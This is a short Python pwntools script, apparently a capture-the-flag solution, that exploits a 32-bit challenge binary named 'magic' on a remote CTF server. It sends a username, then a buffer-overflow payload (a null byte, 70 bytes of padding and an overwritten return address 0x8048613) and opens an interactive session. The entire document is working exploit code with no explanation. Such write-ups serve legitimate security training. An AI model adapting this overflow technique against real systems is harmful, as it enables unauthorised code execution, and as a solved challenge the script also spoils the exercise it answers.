#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'magic' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "bamboofox.cs.nctu.edu.tw"
    port = 10000
    r = remote(ip,port)

context.arch = 'i386'
addr = 0x8048613
payload = "a"+"\x00"+"a" * 70 + p32(addr)

r.recvuntil(":")
r.sendline('tommy')

r.recvuntil(":")
r.sendline(payload)
r.interactive()